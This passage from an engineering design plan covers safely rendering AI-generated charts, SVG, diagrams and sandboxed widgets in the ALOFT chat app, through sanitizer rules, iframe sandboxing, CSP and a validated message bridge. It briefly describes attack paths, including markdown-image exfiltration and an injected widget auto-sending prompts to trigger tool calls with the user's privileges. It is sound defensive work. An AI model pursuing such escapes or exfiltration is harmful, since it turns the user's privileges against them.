DOMPurify is necessary but not sufficient on its own. Its advisory page listed **ten bypass advisories between May and October 2026**. One is Critical (GHSA-cg2g-xh64-v4q7, SAFE_FOR_TEMPLATES), and five are specific to `IN_PLACE` mode ([DOMPurify advisories](https://github.com/cure53/DOMPurify/security/advisories)). `src/lib/visuals/sanitize-svg.ts` should therefore follow these rules:

- **Profile.** Use `USE_PROFILES: {svg: true, svgFilters: true}` with no HTML profile.
- **Forbidden tags.** `foreignObject`, `script`, `style`, `image`, `feImage`, `a`, and the SMIL elements (`animate`, `set`, `animateMotion`, `animateTransform`). `use` is allowed only when its `href` starts with `#`, enforced in a hook.
- **Forbidden attributes.** `style`, external `href`/`xlink:href`, `src`, `action`, `formaction` and `ping`.
- **Modes to avoid.** Never use `IN_PLACE`, `SAFE_FOR_TEMPLATES` or `PARSER_MEDIA_TYPE: 'application/xhtml+xml'`. The October 2026 GHSA-c6gr-qvv4-5v3f skips the SMIL href guard under that last setting ([DOMPurify advisories](https://github.com/cure53/DOMPurify/security/advisories)).
- **`url()` hook.** Allow `url(#id)` fragment references and drop every other `url(...)`.
- **Caps.** Reject input over 100 KB or 5,000 nodes. These are proposed limits.
- **Versioning.** Pin the latest 3.4.x patch and add DOMPurify to the Renovate security group.

Mermaid output carries its own `<style>`, so it needs a separate profile that allows the scoped `<style>` but strips `@import` and external `url()`.

Add the ESLint rule `react/no-danger` with an allowlist of exactly `SafeSvg.tsx` and `MermaidBlock.tsx`. That turns the existing "no `dangerouslySetInnerHTML` in chat code" fact into an enforced invariant.

### Sandbox tiers for code that executes

**Tier A (Phase 3, behind a flag)** is `<iframe sandbox="allow-scripts" srcdoc=…>` with no `allow-same-origin`, which gives an opaque origin with no cookies and no `/api` access. The first element of the frame's `<head>` is a meta CSP:

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:;
font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'
```

Simon Willison showed that JavaScript inside `sandbox="allow-scripts"` cannot strip or escape a meta-tag CSP: "CSP policies defined via meta tags are enforced at parse time" ([Simon Willison, Apr 2026](https://simonwillison.net/2026/Apr/3/test-csp-iframe-escape/)). `X-Frame-Options: DENY` and `frame-ancestors 'none'` govern framing of fetched responses, so they should not block a srcdoc frame. That is an inference that **must be tested** in the target browsers.

Tier A has a real weakness. Same-site srcdoc frames can share the chat's renderer thread, so a `while(true)` freezes the whole chat, and not all browsers isolate sandboxed documents into separate processes ([web.dev](https://web.dev/articles/securely-hosting-user-data)). Tier A therefore supports only vanilla HTML, SVG and JavaScript plus an inlined ALOFT runtime (token injection, `ResizeObserver` height reporting, error capture, vendored morphdom). It loads no third-party libraries.

**Tier B (Phase 4, required for GA of widgets and artifacts)** follows the pattern every major vendor converges on: Anthropic's `claudeusercontent.com`, OpenAI's `web-sandbox.oaiusercontent.com` and the MCP Apps rule that "the Host and the Sandbox MUST have different origins" ([MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)). It works as follows:

- **Domain.** A **separate registrable domain** such as `aloft-usercontent.net`, not a subdomain of the app, because a subdomain is same-site and cookie tossing remains possible. Ideally it is on the Public Suffix List with a random subdomain per conversation ([web.dev](https://web.dev/articles/securely-hosting-user-data)).
- **Shim.** The domain serves only a static `shim.html` plus **pre-bundled vendor libraries**: React 18, recharts (already a dependency), lucide and d3. The shim renders the artifact into a nested `sandbox="allow-scripts"` blob iframe.
- **No public CDNs.** jsdelivr and unpkg would let an attacker publish a package and load it. The libraries load from the shim origin instead.
- **React transpiling.** React artifacts are transpiled on the server with esbuild, which is present in `node_modules` through the Vite toolchain. That avoids shipping `@babel/standalone`, which is about 542 KB gzip ([bundlephobia](https://bundlephobia.com/package/@babel/standalone)).
- **Separation from DATA360.** This domain must share nothing (keys, logs, settings) with DATA360, per the team's standing rule.

The shim's header CSP should be `default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'none'; frame-src blob:; object-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors https://<aloft-app-origin>`. It also needs a restrictive `Permissions-Policy` and `Referrer-Policy: no-referrer`. The global `X-Frame-Options: DENY` must not apply on that host.

The outer iframe in the app gets these attributes:

- `sandbox="allow-scripts"`, plus `allow-same-origin` **only** because the frame is cross-site.
- An `allow=` attribute that denies camera, microphone, geolocation, clipboard, payment and USB.
- `referrerpolicy="no-referrer"` and `loading="lazy"`.
- `title="Generated visual (sandboxed)"`.

Never grant `allow-top-navigation`, `allow-popups-to-escape-sandbox`, `allow-forms`, `allow-modals` or `allow-downloads` ([MDN iframe](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe)).

### App-origin CSP

Roll the app-origin CSP out in Report-Only first, as the existing `next.config.ts` comment already plans. Nonces are not an option because the SPA's `index.html` is static, and Next's own guide says static pages cannot get nonces ([local Next CSP guide](../node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md)). Use `script-src 'self' 'sha256-…'`, with hashes for the inline theme and `APPEARANCE_BOOT_SCRIPT` in `web/index.html`, and add:

- `img-src 'self' data: blob:`, which closes markdown-image exfiltration.
- `frame-src https://*.aloft-usercontent.net`.
- `object-src 'none'`.
- `form-action 'self'`.

Evaluate `require-trusted-types-for 'script'` later. Its compatibility with Radix and framer-motion is unverified.

### The postMessage bridge

The bridge in `src/lib/visuals/bridge.ts` corrects the weaknesses that the MCP Apps spec text leaves open: no mandated origin checks, `'*'` targetOrigin in its sample code, and no URL validation for `open-link` ([MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)).

**Validation.**

- Accept a message only when `event.source === iframe.contentWindow`. Opaque frames report `origin === "null"`, so origin cannot be used for the inner frame.
- For the Tier B shim, also check the exact origin.
- Never post with `'*'`.
- Validate every message against a versioned zod union and echo a per-frame random channel token.

**Message types.**

| Message | Behavior |
|---|---|
| `ready` | The host sends nothing until it arrives. |
| `render-chunk` / `render-complete` | Streaming content into the frame. |
| `theme` | Resolved token values only, never URLs. This closes the CSS `@import` hole. |
| `resize` | Clamped to 48–4,000 px and rAF-throttled. |
| `error` | Feeds "Fix this". |
| `open-link` | The host validates `https:`, shows the real hostname and confirms, then calls `window.open(url,'_blank','noopener,noreferrer')`. |
| `suggest-prompt` | The host only **fills the composer**. It never sends. |

The last row departs from Claude's `sendPrompt`. ALOFT departs deliberately, because an injected widget that auto-sends prompts is a confused deputy that can trigger warehouse tool calls with the user's privileges.

**Data and limits.**

- **Data flows only inward.** Rows go in the render message. No tool calls, tokens or credentials ever enter the frame.
- **Watchdog.** Remove a frame that has not posted `ready` within 5 seconds, or that exceeds 512 KB of source.
- **Boundary chrome.** Wrap every frame with a visible "Generated content" label and keep host-styled buttons out of it, per the MCP Apps social-engineering guidance ([MCP Apps spec](https://github.com/modelcontextprotocol/ext-apps/blob/main/specification/2026-01-26/apps.mdx)).

## Polish decides whether it feels like Claude: accessibility, theming, performance, tests

### Accessibility

Treat every visual as a W3C "complex image." It needs a short accessible name plus a long description linked with `aria-describedby`, and the description should be available to everyone ([W3C WAI Complex Images](https://www.w3.org/WAI/tutorials/images/complex)). `VisualBlock` therefore renders:

- a `<figure aria-labelledby=title aria-describedby=summary>`;
- the spec's required `summary` as visible caption text;
- a "View data" toggle that renders a real `<table>` from the same rows, reusing the existing `DataTable` in `StreamingMessage.tsx`.

Make the ECharts canvas `aria-hidden` when the table is the keyboard-navigable path.

Register `AriaComponent` in `echartsCore.ts` and turn on `aria.decal`, so series are not distinguished by color alone. The handbook says `aria.show` while the API reference says `aria.enabled`, so check against ECharts 6.1 ([ECharts ARIA handbook](https://echarts.apache.org/handbook/en/best-practices/aria)).

Mermaid turns `accTitle`/`accDescr` into `<title>`/`<desc>` ([Mermaid accessibility](https://mermaid.js.org/config/accessibility.html)). The prompt requires them, and the client injects them from the surrounding text when they are missing. Adrian Roselli argues that Mermaid output "almost guarantees" WCAG violations ([adrianroselli.com](https://adrianroselli.com/2022/03/maybe-dont-use-flow-charts-on-github.html)), so the data-and-summary fallback is essential, not decoration.

During streaming, set `aria-busy="true"` on the message and announce only status ("Generating response", "Chart ready") from a separate polite live region. Never mirror tokens into a live region ([azukiazusa.dev](https://azukiazusa.dev/en/blog/accessible-streaming-chat-ui)). Honor `prefers-reduced-motion` with ECharts `animation:false` and non-pulsing skeletons.

### Theming

Charts and diagrams should follow the user's live theme, not hard-coded palettes. The ECharts themes `aloft-dark`/`aloft-light` are hard-coded hex values ("CSS vars not readable in SSR"), and they predate the current terracotta-light / blue-dark accents and user-chosen `ACCENT_PRESETS` ([aloftDarkTheme.ts](../src/lib/studio/aloftDarkTheme.ts); [globals.css:1615-1660](../src/app/globals.css); [appearance.ts](../src/lib/theme/appearance.ts)). There is no SSR anymore, so `theme-runtime.ts` can read `getComputedStyle(document.documentElement)` on the client.

From those tokens it builds:

- a registered ECharts theme per (mode, accent) pair, applied by re-init or `setTheme`, because `setOption` alone does not change the theme ([ECharts theme test](https://apache.googlesource.com/echarts/+/refs/heads/master/test/theme.html));
- Mermaid `themeVariables`;
- the sandbox token map.

It subscribes to `useIsDark()` and appearance changes, and caches renders per (hash, theme).

The categorical palette should start from the existing Okabe-Ito `CATEGORICAL` set (capped at 6) in `inspector-viz-tokens.ts`, checked for 3:1 contrast on both surfaces ([inspector-viz-tokens.ts](../src/lib/dashboards/inspector-viz-tokens.ts)).

Sandboxed frames do not inherit CSS variables or the self-hosted `@fontsource` fonts. The runtime receives resolved values over the bridge, and fonts are served from the shim origin or inlined as `data:`, never from Google Fonts. The typography guard forbids that both in spirit and by regex. The runtime's CSS template in `.ts` must use only `var(--type-*)` values and the allowed families, and must not add numeric `fontSize` literals, or `inlineFontSize: 232` will grow ([typography-baseline.json](../src/lib/typography/__tests__/typography-baseline.json)).

### Performance and bundle

Everything heavy loads lazily, at the block level, inside the already lazy-loaded chat routes ([router.tsx](../web/src/router.tsx)).

| Dependency | Gzip (default entry) | Loading |
|---|---|---|
| ECharts (already present) | 359 KB full, less tree-shaken ([bundlephobia](https://bundlephobia.com/package/echarts)) | Existing lazy `echarts-for-react` |
| Mermaid 12.2.0 | 169 KB, plus lazy diagram chunks ([bundlephobia](https://bundlephobia.com/package/mermaid)) | `import()` on first closed mermaid fence. Moving Mermaid to a dynamic import cut coder/mux startup JS from about 2,833 KB to about 2,292 KB ([coder/mux](https://github.com/coder/mux/commit/bd18b4afa124e70db598d7deb20cc643b7ef0b47)). |
| Shiki 4.5 (JS regex engine) | 63 KB, plus per-language grammars ([bundlephobia](https://bundlephobia.com/package/shiki)) | `shiki/core` with dynamic languages and dual themes via CSS variables ([Shiki dual themes](https://shiki.style/guide/dual-themes)) |
| Streamdown 2.7.1 (option) | 150 KB ([bundlephobia](https://bundlephobia.com/package/streamdown)) | Would load with the chat chunk |
| remend 1.4.0 | Small, 28 KB unpacked ([npm](https://registry.npmjs.org/remend)) | Inline |
| DOMPurify | Not measured | Lazy with `SafeSvg`/`MermaidBlock` |

On markdown quality, the plan takes a position. **Keep `AssistantContent` as the facade**, and in Phase 2 replace its prose engine incrementally:

- add links and real nested `<ul>`/`<ol>` to the existing tokenizer;
- add `remend` for incomplete-markdown repair, which has no React dependency;
- highlight code with Shiki.

Do not swap in Streamdown wholesale. Streamdown is excellent, works with React 18 and is what Vercel's own chatbot uses ([npm](https://registry.npmjs.org/streamdown); [vercel/chatbot](https://raw.githubusercontent.com/vercel/chatbot/main/package.json)). But its 150 KB gzip, Tailwind v4-oriented setup, and permissive rehype-harden defaults ("allows all image and link prefixes") ([streamdown llms.txt](https://streamdown.ai/llms.txt)) would all need overriding. It would also have to reproduce ALOFT-specific behavior: JSON tables, section-title heuristics and typography tokens. Revisit if the hand-rolled path starts accumulating bugs.

Mermaid 12 targets ES2024 and Safari 17.4+ ([Mermaid usage](https://mermaid.js.org/config/usage.html)). If the enterprise browser matrix includes older Safari, pin 11.15.x.

### Testing

Tests follow existing conventions: vitest 4.1 with a per-file `// @vitest-environment jsdom` docblock, and the global `echarts-for-react` mock ([vitest.setup.ts](../vitest.setup.ts)). Extend `AssistantContent.json-table.test.tsx` with:

- an unclosed fence that renders a skeleton, not prose;
- an `aloft-chart` fence that renders the chart, not a table;
- an invalid spec that falls back to a code block with an error card;
- a hyphenated language that dispatches;
- memoization that keeps earlier blocks stable.

Add `sanitize-svg.test.ts` to check that `<script>`, `on*`, `foreignObject`, `javascript:` hrefs, external `url()`, SMIL `href` rewrites, oversize input and off-vocabulary classes are all removed. Add a Mermaid mock with parse-success and parse-failure cases. Add zod tests that the bridge rejects a wrong `source`, an unknown `type` or a missing token. Extend the route tests:

- `chat.route.test.ts`: `render_chart` produces one `text` event with a valid fence, `data_ref` resolves, and provenance failure returns `is_error`;
- `agent-chats.test.ts`: fences round-trip through `parseChatMessages` and history compaction;
- `client-stream-error.test.ts` and `stripInspectorMarkup`: fence contents are preserved.

Keep the typography baseline flat.

jsdom cannot verify the browser-specific security claims, and Playwright is not installed. Add a small Playwright suite for:

- srcdoc frames under the real headers (does `X-Frame-Options` interfere, and is CSP inherited);
- a Willison-style meta-CSP escape attempt;
- a WebRTC/STUN leak test;
- a `while(true)` widget, to check the watchdog and whether the chat stays responsive.

Finally, build a VisEval-style golden set of about 50 prompts across ALOFT's providers, scoring validity, legality and readability ([VisEval](https://arxiv.org/html/2407.00981v2)). Use it to gate which models get which visual rules.

## Five phases ship charts in weeks and code execution only behind a sandbox

The durations below are rough estimates for one or two engineers. The order is fixed by risk: no phase executes model JavaScript before its isolation exists.

| Phase | Scope | Key files | Exit criteria |
|---|---|---|---|
| **0. Foundation** (~1 week) | Block tokenizer with open-fence detection. `[\w-]+` languages. `VisualBlock` registry, skeleton and error boundary. Links in `renderInline`. Strippers skip fences. Feature flag. Fix the dead Inspector `chart_spec` path. | `src/lib/visuals/blocks.ts`, `StreamingMessage.tsx`, `agent-loop.ts`, `useInspectorChat.ts` | Existing 937-test baseline green. Streaming fences never flash as prose. |
| **1. Inline charts** (~2–3 weeks) | `AloftChartSpec v1`, `chart-adapter`, `InlineChart` with runtime theme, ARIA/decal, View data. `render_chart` tool with `data_ref` on Agents → Use and Inspector. Server-materialized fences. `VISUAL_RESPONSE_RULES` gated by surface. History compaction. | `spec.ts`, `chart-adapter.ts`, `InlineChart.tsx`, `render-chart-tool.ts`, `answer-rules.ts`, `run-catalog-agent.ts`, `echartsCore.ts`, `agent-chats.ts` | Charts survive reload on every surface. The golden set passes its threshold on Opus/Sonnet. No hallucinated data in eval. |
| **2. Diagrams, SVG, markdown quality** (~2 weeks) | Lazy `MermaidBlock`, `SafeSvg` with DOMPurify, Shiki highlighting, nested lists, remend, "Fix this" self-repair, SessionCockpit switch, `react/no-danger` lint. | `MermaidBlock.tsx`, `SafeSvg.tsx`, `sanitize-svg.ts`, `eslint.config.cjs`, `SessionCockpit.tsx` | Sanitizer suite green. Mermaid absent from the initial chunk. Theme switch re-renders without reload. |
| **3. Sandboxed widgets, Tier A** (~3 weeks, internal flag) | `aloft-widget` fence / `show_widget` tool, srcdoc iframe with meta CSP, bridge, vendored morphdom streaming, watchdog, boundary chrome. App CSP in Report-Only. | `SandboxedWidget.tsx`, `bridge.ts`, `web/sandbox/runtime.ts`, `next.config.ts` | Playwright security suite green. No CSP reports from normal use. Widgets limited to strong models. |
| **4. Artifacts, Tier B** (~4+ weeks, needs infra) | Separate registrable domain and shim, pre-bundled libraries, server esbuild transpile for React, side panel with versions and download/fullscreen, `chat_artifacts` table, CSP enforced with `frame-src`. | `prisma/schema.prisma`, new sandbox deployment, `ArtifactPanel.tsx` | Per-conversation origin isolation verified. Widgets move from Tier A to Tier B before GA. |

Docs updates ride along with each phase:

- `docs/CHANGELOG.md` (mandatory);
- `ARCHITECTURE.md` §5.7, which still claims "Next.js 15.5 — App Router, SSR" ([ARCHITECTURE.md:115-131](../ARCHITECTURE.md));
- `docs/inspector-architecture.html` (UI composition);
- `docs/DESIGN_SYSTEM.md`, whose boot-script reference to the non-existent `src/app/layout.tsx` is stale ([DESIGN_SYSTEM.md](../docs/DESIGN_SYSTEM.md)).

| Risk | Likelihood / impact | Mitigation |
|---|---|---|
| Sanitizer bypass (DOMPurify ships about 2 advisories a month) | High / High | SVG-only profile, no risky modes, pinned version, app CSP, move to the sandbox if bypasses touch the SVG profile. |
| Mermaid CSS-injection CVEs recur | Medium / Medium | `strict`, pinned version, output sanitized, sandbox fallback path. |
| 4,096 output-token cap truncates visuals | High / Medium | `data_ref` instead of retyped rows. Raise `maxTokens` on visual-enabled turns. Show a truncation state. |
| Bedrock Converse buffers tool input (`eager_input_streaming` unverified) | High / Low | Status labels during `tool_call_running`. Test with the Opus 5.5 model ID. |
| Weaker providers (Foundry, xAI, LLM Lite) emit bad specs | High / Medium | Semantic spec (per Flint), capability-gated rules, golden-set evals, repair loop. |
| History bloat from data-bearing fences (60k cap) | Medium / Medium | Compact payloads in model history. Artifacts by reference. |
| Tier A same-process DoS or Spectre exposure | Medium / Medium | Internal flag, watchdog, no libraries, Tier B before GA. |
| srcdoc behavior under `X-Frame-Options`/CSP differs by browser | Unknown / Medium | Playwright matrix before Phase 3 exit. |
| Theme drift: hard-coded ECharts hex vs user accents | Certain today / Low | `theme-runtime.ts` from computed tokens. |
| Duplicate charts (Inspector tools plus inline rules) | Medium / Low | The prompt names one source of truth per case. |
| Sandbox domain accidentally shared with DATA360 | Low / High | Separate domain, account and logs, by policy. |

## Conclusion

ChatGPT and Claude differ less in technology than it first appears. The rendering stacks are converging: MCP Apps is now a joint standard, and both vendors use cross-origin sandbox domains and short status labels. What differs is the discipline. They ship constrained formats the model gets right, render cheaply until a block closes, and keep code execution on another origin. For ALOFT the decisive move is architectural rather than visual. Making the fenced block in `content` the one persisted form of a visual, and having the server write tool output into that form, turns four separate persistence paths into one. It fixes two existing chart-loss bugs along the way, and every later tier (Mermaid, SVG, widgets, artifacts) lands as a new renderer on the same rail instead of a new protocol.

The most important unknowns can only be settled empirically, so they belong at the start of the schedule:

- whether srcdoc frames behave as expected under ALOFT's real headers;
- whether `eager_input_streaming` passes through Converse;
- how much worse the non-Anthropic providers are at chart specs.

ALOFT also has one advantage neither vendor has used. It owns both the data and the chart compiler, so it can *verify* that every plotted number came from a tool result. Claude and ChatGPT cannot enforce that guarantee inside a generic chat, and it is worth more to an enterprise analytics user than any amount of animated SVG.
